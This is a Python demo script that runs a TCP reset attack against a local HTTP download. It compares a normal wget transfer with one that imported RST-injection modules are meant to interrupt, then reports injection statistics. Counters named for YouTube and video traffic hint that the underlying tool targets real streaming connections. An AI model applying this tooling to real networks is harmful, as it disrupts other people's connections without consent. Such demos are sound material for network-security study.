#!/usr/bin/env python3
"""
Simple TCP Reset Attack Demo
Using built-in Python HTTP server and wget for demonstration
"""

import subprocess
import time
import threading
import os
import signal
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def create_large_file():
    """Create a large file to download"""
    print("[DEMO] Creating large test file...")
    with open("large_test_file.bin", "wb") as f:
        # Create 10MB file
        for i in range(10000):
            f.write(b"TEST_DATA_CHUNK_" + str(i).zfill(6).encode() + b"_" + (b"X" * 1000))
    print("[DEMO] Created large_test_file.bin (10MB)")

def start_http_server():
    """Start a simple HTTP server"""
    print("[DEMO] Starting HTTP server on port 8080...")
    process = subprocess.Popen([
        sys.executable, "-m", "http.server", "8080"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return process

def test_download():
    """Test downloading the file"""
    print("[DEMO] Testing download...")
    try:
        result = subprocess.run([
            "wget", "-O", "/dev/null", 
            "http://127.0.0.1:8080/large_test_file.bin"
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            print("[DEMO] Download completed successfully")
        else:
            print(f"[DEMO] Download failed: {result.stderr}")
    except subprocess.TimeoutExpired:
        print("[DEMO] Download timed out")
    except Exception as e:
        print(f"[DEMO] Download error: {e}")

def run_tcp_reset_attack():
    """Run the TCP reset attack"""
    print("[DEMO] Starting TCP Reset Attack...")
    
    # Import our attack components
    try:
        from config_manager import ConfigManager
        from packet_monitor import PacketMonitor
        
        # Load demo config
        config = ConfigManager("config/demo_config.ini")
        
        # Create packet monitor
        monitor = PacketMonitor("127.0.0.1", "lo", config)
        
        print("[DEMO] Starting packet monitoring for TCP reset attack...")
        if monitor.start_monitoring():
            print("[DEMO] Attack monitoring active - waiting for traffic...")
            return monitor
        else:
            print("[DEMO] Failed to start monitoring")
            return None
            
    except Exception as e:
        print(f"[DEMO] Error starting attack: {e}")
        import traceback
        traceback.print_exc()
        return None

def run_demo():
    """Run the complete demo"""
    if os.geteuid() != 0:
        print("Demo requires root privileges for packet capture")
        print("Run: sudo python3 simple_demo.py")
        return
    
    print("=" * 60)
    print("TCP RESET ATTACK DEMONSTRATION")
    print("=" * 60)
    
    # Create test file
    create_large_file()
    
    # Start HTTP server
    server = start_http_server()
    time.sleep(2)  # Let server start
    
    try:
        # Test normal download first
        print("\n--- PHASE 1: Normal Download (No Attack) ---")
        test_download()
        
        # Start attack
        print("\n--- PHASE 2: Download with TCP Reset Attack ---")
        monitor = run_tcp_reset_attack()
        
        if monitor:
            # Wait a moment for monitoring to start
            time.sleep(2)
            
            # Start download in background
            print("[DEMO] Starting download that will be attacked...")
            download_process = subprocess.Popen([
                "wget", "-O", "/dev/null", "--progress=bar:force",
                "http://127.0.0.1:8080/large_test_file.bin"
            ])
            
            # Let it run for a bit, then it should be reset
            print("[DEMO] Download started - should be interrupted by TCP reset...")
            download_process.wait()
            
            # Stop monitoring
            monitor.stop_monitoring()
            
            print("\n--- DEMO RESULTS ---")
            stats = monitor.rst_injector.get_statistics()
            print(f"Total packets monitored: {monitor.packet_count}")
            print(f"Video/Target packets detected: {monitor.youtube_packet_count}")
            print(f"RST packets injected: {stats['total_injections']}")
            print(f"Connections attacked: {stats['connections_attacked']}")
            
            if stats['total_injections'] > 0:
                print("\n✅ TCP RESET ATTACK SUCCESSFUL!")
                print("The download was interrupted by RST packet injection.")
            else:
                print("\n❌ No RST packets were injected.")
                print("This might be due to packet filtering or timing issues.")
    
    finally:
        # Cleanup
        print("\n[DEMO] Cleaning up...")
        server.terminate()
        if os.path.exists("large_test_file.bin"):
            os.remove("large_test_file.bin")
        print("[DEMO] Demo completed!")

if __name__ == "__main__":
    run_demo()
